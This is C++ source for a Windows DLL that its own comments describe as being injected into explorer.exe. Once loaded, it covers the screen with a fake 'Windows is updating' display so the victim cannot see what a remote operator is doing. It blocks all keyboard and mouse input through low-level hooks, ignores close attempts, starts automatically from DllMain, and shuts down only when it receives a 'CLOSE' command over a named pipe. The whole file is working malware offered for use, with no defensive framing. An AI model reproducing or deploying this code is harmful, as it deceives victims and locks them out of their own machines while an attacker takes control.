// fake_update.cpp - DLL that displays a fake "Windows is updating" fullscreen overlay
// Injected into explorer.exe to block victim's view while operator controls remotely
#include <windows.h>
#include <string>
#include <atomic>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// Named pipe for remote close signal
#define FAKE_UPDATE_PIPE "\\\\.\\pipe\\FakeUpdatePipe"

std::atomic<bool> g_running(false);
std::atomic<bool> g_closing(false);
HWND g_hwnd = NULL;
HHOOK g_keyboardHook = NULL;
HHOOK g_mouseHook = NULL;

// Low-level keyboard hook - blocks ALL keys including Alt+F4, Ctrl+Alt+Del, etc.
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Block all keyboard input
        return 1;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Low-level mouse hook - blocks ALL mouse input
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Block all mouse input
        return 1;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Window procedure for the fake update window
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            // Get window dimensions
            RECT rect;
            GetClientRect(hwnd, &rect);
            int w = rect.right - rect.left;
            int h = rect.bottom - rect.top;
            
            // Draw blue background (Windows Update blue)
            HBRUSH bgBrush = CreateSolidBrush(RGB(0, 120, 215));
            FillRect(hdc, &rect, bgBrush);
            DeleteObject(bgBrush);
            
            // Set up text
            SetBkMode(hdc, TRANSPARENT);
            
            // "Working on updates" text
            HFONT hFontBig = CreateFontA(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            HFONT hFontSmall = CreateFontA(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            HFONT hFontPercent = CreateFontA(36, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            
            // Title
            SelectObject(hdc, hFontBig);
            SetTextColor(hdc, RGB(255, 255, 255));
            const char* title = "Working on updates";
            RECT titleRect = {0, h/3, w, h/3 + 60};
            DrawTextA(hdc, title, -1, &titleRect, DT_CENTER | DT_TOP);
            
            // Subtitle
            SelectObject(hdc, hFontSmall);
            const char* subtitle = "Don't turn off your computer";
            RECT subRect = {0, h/3 + 60, w, h/3 + 100};
            DrawTextA(hdc, subtitle, -1, &subRect, DT_CENTER | DT_TOP);
            
            // Spinning dots animation (simple text-based)
            static int dotPhase = 0;
            dotPhase = (dotPhase + 1) % 20;
            std::string dots;
            for (int i = 0; i < 5; i++) {
                dots += (i == dotPhase / 4) ? "o" : ".";
            }
            RECT dotsRect = {0, h/3 + 110, w, h/3 + 150};
            DrawTextA(hdc, dots.c_str(), -1, &dotsRect, DT_CENTER | DT_TOP);
            
            // Percentage counter (slowly increments)
            static int percent = 0;
            if (!g_closing) {
                percent = (percent + 1) % 101;
            }
            SelectObject(hdc, hFontPercent);
            char percentStr[16];
            sprintf(percentStr, "%d%% complete", percent);
            RECT pctRect = {0, h/3 + 160, w, h/3 + 210};
            DrawTextA(hdc, percentStr, -1, &pctRect, DT_CENTER | DT_TOP);
            
            // "Please don't turn off your PC" at bottom
            SelectObject(hdc, hFontSmall);
            SetTextColor(hdc, RGB(200, 200, 200));
            const char* footer = "Your computer will restart automatically.";
            RECT footerRect = {0, h - 80, w, h - 40};
            DrawTextA(hdc, footer, -1, &footerRect, DT_CENTER | DT_TOP);
            
            DeleteObject(hFontBig);
            DeleteObject(hFontSmall);
            DeleteObject(hFontPercent);
            
            EndPaint(hwnd, &ps);
            
            // Schedule next repaint for animation
            if (!g_closing) {
                InvalidateRect(hwnd, NULL, TRUE);
            }
            return 0;
        }
        
        case WM_CLOSE:
            // Ignore close attempts
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

// Thread that listens on named pipe for close signal
DWORD WINAPI PipeListenerThread(LPVOID lpParam) {
    (void)lpParam;
    while (g_running && !g_closing) {
        HANDLE hPipe = CreateNamedPipeA(
            FAKE_UPDATE_PIPE,
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 0, 0, 1000, NULL
        );
        
        if (hPipe == INVALID_HANDLE_VALUE) {
            Sleep(500);
            continue;
        }
        
        // Wait for a client to connect (timeout after 1 second)
        BOOL connected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
        
        if (connected) {
            char buffer[32] = {0};
            DWORD bytesRead = 0;
            if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                buffer[bytesRead] = '\0';
                if (strcmp(buffer, "CLOSE") == 0) {
                    g_closing = true;
                    // Post quit message to the window
                    if (g_hwnd) {
                        PostMessage(g_hwnd, WM_DESTROY, 0, 0);
                    }
                }
            }
            CloseHandle(hPipe);
        } else {
            CloseHandle(hPipe);
        }
    }
}

// Main DLL entry point - creates the fake update window
void ShowFakeUpdate() {
    if (g_running) return;
    g_running = true;
    g_closing = false;
    
    // Register window class
    HINSTANCE hInstance = GetModuleHandleA(NULL);
    WNDCLASSEXA wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXA);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_WAIT);  // Wait cursor
    wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(0, 120, 215));
    wc.lpszClassName = "FakeUpdateWindowClass";
    
    if (!RegisterClassExA(&wc)) return;
    
    // Get screen dimensions
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    
    // Create fullscreen topmost window
    g_hwnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
        "FakeUpdateWindowClass",
        "Windows Update",
        WS_POPUP | WS_VISIBLE,
        0, 0, screenW, screenH,
        NULL, NULL, hInstance, NULL
    );
    
    if (!g_hwnd) {
        g_running = false;
        return;
    }
    
    // Set the window to be always on top and cover everything
    SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, screenW, screenH, SWP_SHOWWINDOW);
    
    // Install keyboard and mouse hooks
    g_keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    g_mouseHook = SetWindowsHookExA(WH_MOUSE_LL, MouseProc, hInstance, 0);
    
    // Start pipe listener thread for remote close signal
    CreateThread(NULL, 0, PipeListenerThread, NULL, 0, NULL);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && !g_closing) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = NULL;
    }
    if (g_mouseHook) {
        UnhookWindowsHookEx(g_mouseHook);
        g_mouseHook = NULL;
    }
    if (g_hwnd) {
        DestroyWindow(g_hwnd);
        g_hwnd = NULL;
    }
    UnregisterClassA("FakeUpdateWindowClass", hInstance);
    g_running = false;
}

// Thread function wrapper for CreateThread
DWORD WINAPI ShowFakeUpdateThread(LPVOID lpParam) {
    (void)lpParam;
    ShowFakeUpdate();
    return 0;
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Create a thread to show the fake update window
            // We must create a new thread because DllMain is called with loader lock
            CreateThread(NULL, 0, ShowFakeUpdateThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
